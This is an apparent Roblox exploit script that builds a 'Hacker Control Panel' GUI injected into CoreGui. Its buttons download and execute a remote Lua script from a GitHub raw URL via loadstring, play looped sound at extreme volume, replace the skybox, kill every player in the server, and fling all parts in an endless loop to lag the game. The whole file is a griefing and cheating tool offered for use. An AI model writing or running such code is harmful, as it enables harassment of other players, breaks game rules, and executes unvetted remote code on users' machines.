local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Execute = Instance.new("TextButton")
local SoundSpam = Instance.new("TextButton")
local Skybox = Instance.new("TextButton")
local KillAll = Instance.new("TextButton")
local LagToggle = Instance.new("TextButton")
local SoundBox = Instance.new("TextBox")
local Title = Instance.new("TextLabel")

ScreenGui.Parent = game.CoreGui
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Frame.Position = UDim2.new(0.4, 0, 0.3, 0)
Frame.Size = UDim2.new(0, 250, 0, 300)
Frame.Active = true
Frame.Draggable = true

Title.Parent = Frame
Title.Text = "Hacker Control Panel"
Title.Size = UDim2.new(1, 0, 0, 30)
Title.TextColor3 = Color3.fromRGB(0, 255, 0)
Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

Execute.Parent = Frame
Execute.Text = "Execute Script"
Execute.Position = UDim2.new(0, 0, 0, 40)
Execute.Size = UDim2.new(1, 0, 0, 30)
Execute.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/coolrobloxkid23/hahagui/main/script.lua"))()
end)

SoundBox.Parent = Frame
SoundBox.PlaceholderText = "Sound ID Here"
SoundBox.Position = UDim2.new(0, 0, 0, 80)
SoundBox.Size = UDim2.new(1, 0, 0, 30)

SoundSpam.Parent = Frame
SoundSpam.Text = "Play Sound"
SoundSpam.Position = UDim2.new(0, 0, 0, 120)
SoundSpam.Size = UDim2.new(1, 0, 0, 30)
SoundSpam.MouseButton1Click:Connect(function()
    local sound = Instance.new("Sound", game.Workspace)
    sound.SoundId = "rbxassetid://"..SoundBox.Text
    sound.Volume = 9999
    sound.Looped = true
    sound:Play()
end)

Skybox.Parent = Frame
Skybox.Text = "Scary Skybox"
Skybox.Position = UDim2.new(0, 0, 0, 160)
Skybox.Size = UDim2.new(1, 0, 0, 30)
Skybox.MouseButton1Click:Connect(function()
    local l = game.Lighting
    local ids = "5221523741"
    l.Sky.SkyboxBk = "rbxassetid://"..ids
    l.Sky.SkyboxDn = "rbxassetid://"..ids
    l.Sky.SkyboxFt = "rbxassetid://"..ids
    l.Sky.SkyboxLf = "rbxassetid://"..ids
    l.Sky.SkyboxRt = "rbxassetid://"..ids
    l.Sky.SkyboxUp = "rbxassetid://"..ids
end)

KillAll.Parent = Frame
KillAll.Text = "Kill All Players"
KillAll.Position = UDim2.new(0, 0, 0, 200)
KillAll.Size = UDim2.new(1, 0, 0, 30)
KillAll.MouseButton1Click:Connect(function()
    for _,player in pairs(game.Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("Humanoid") then
            player.Character.Humanoid.Health = 0
        end
    end
end)

LagToggle.Parent = Frame
LagToggle.Text = "Toggle Lag"
LagToggle.Position = UDim2.new(0, 0, 0, 240)
LagToggle.Size = UDim2.new(1, 0, 0, 30)
LagToggle.MouseButton1Click:Connect(function()
    while true do
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") then
                v.Velocity = Vector3.new(math.random(-9999,9999), math.random(-9999,9999), math.random(-9999,9999))
            end
        end
        wait(0.1)
    end
end)
